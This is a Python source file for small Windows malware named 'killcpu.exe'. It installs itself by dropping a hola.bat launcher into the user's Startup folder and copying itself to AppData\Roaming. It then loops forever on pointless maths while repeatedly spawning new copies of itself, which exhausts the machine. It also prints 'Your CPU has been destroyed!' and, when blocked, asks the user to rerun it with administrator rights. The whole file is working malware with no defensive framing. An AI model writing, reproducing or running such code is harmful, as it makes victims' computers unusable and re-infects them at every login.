# -*- coding: utf-8 -*-
import os
from time import sleep
import math
import getpass
import shutil

c = 10000000532525125215512
a = 9888888812121312221334
b = 9999999999243214213251551
mypath = os.path.abspath('killcpu.exe')
wthareyoudo = False

name = os.path.basename(mypath)

user = getpass.getuser()

mydir = os.getcwd()

holaorigpath = mydir + "\\" + "hola.bat"

pathtohola = r"C:\Users\\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

pathtochekhola = r"C:\Users\\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hola.bat"

copypath = r"C:\Users\\" + user + "\AppData\Roaming"

weremyhola = os.path.exists(path=pathtochekhola)
if weremyhola == False :
 filec = open("hola.bat", "w")
 filec.close()
 with open('hola.bat', 'a') as f:
  f.write("chcp 1251" +"\n"+"cd " + copypath + "\nstart "+ name)
  f.close()
 try:
  shutil.move(holaorigpath, pathtohola)
  shutil.copy(mypath, copypath)
 except PermissionError:
   os.remove("hola.bat")
   wthareyoudo = True

if wthareyoudo == False :
 while True : # say goodby!
  a = a / 1.1
  b = b * 1.1
  b = math.cos(b)
  c = math.sin(c)
  d = c * b
  a = a / 1.1
  b = b * 1.1
  b = math.cos(b)
  c = math.sin(c)
  d = c * b
  a = a / 1.1
  b = b * 1.1
  b = math.cos(b)
  c = math.sin(c)
  d = c * b
  print(b)
  print(a)
  print(a * b)
  print(a / c)
  print(b * c)
  print(d)
  print("Your CPU has been destroyed!")
  print("Your CPU has been destroyed!")
  print("Your CPU has been destroyed!")
  os.system("start " + name)
if wthareyoudo == True :
 while True:
  print("Error! code: 1. please restart the program with administrator rights")
  sleep(10000)